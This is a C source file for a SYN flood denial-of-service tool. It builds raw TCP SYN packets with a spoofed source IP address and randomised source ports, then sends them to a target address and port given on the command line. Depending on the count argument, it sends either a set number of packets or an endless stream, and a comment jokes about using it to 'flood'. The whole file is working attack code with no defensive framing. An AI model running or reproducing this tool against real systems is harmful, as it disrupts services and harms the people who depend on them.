#include<stdio.h>
#include<string.h> //memset
#include<sys/socket.h>
#include<stdlib.h> //for exit(0);
#include<errno.h> //For errno - the error number
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/in.h>    // opensource
#include<netinet/ip.h>    //Provides declarations for ip header
#include<arpa/inet.h>    // opensource
#include<time.h> //Open source

struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;

    struct tcphdr tcp;
};



unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

int SYN_FLOODING (int argc, char* argv[])
{
    srand((unsigned int)time(NULL));
    int Random_port = 0;

    int count=0;
    count = atoi(argv[4]);
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    strcpy(source_ip , "123.123.123.135");
    int port = atoi(argv[3]);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(argv[2]);


    
    //Uncommend the loop if you want to flood :)
    if(count==0)
{
    while (1)
    {
memset (datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons (Random_port);
    tcph->dest = htons (port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
        Random_port = rand()%60000;
        //Send the packet
        if (sendto (s,      /* our socket */
                    datagram,   /* the buffer containing headers and data */
                    iph->tot_len,    /* total length of our datagram */
                    0,      /* routing flags, normally always 0 */
                    (struct sockaddr *) &sin,   /* socket addr, just like in */
                    sizeof (sin)) < 0)       /* a normal send() */
        {
            printf ("error\n");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send \n");
        }
    }
}
   else
{
   for(int i=0; i<count; i++)
{
memset (datagram, 0, 4096); /* zero out the buffer */

    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //TCP Header
    tcph->source = htons (Random_port);
    tcph->dest = htons (port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* first and only tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urg_ptr = 0;
    //Now the IP checksum

    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
        Random_port = rand()%60000;
        
        if (sendto (s,      /* our socket */
                    datagram,   /* the buffer containing headers and data */
                    iph->tot_len,    /* total length of our datagram */
                    0,      /* routing flags, normally always 0 */
                    (struct sockaddr *) &sin,   /* socket addr, just like in */
                    sizeof (sin)) < 0)       /* a normal send() */
        {
            printf ("error\n");
        }
        //Data send successfully
        else
        {
            printf ("Packet Send \n");
        }
}
}
    return 0;
}
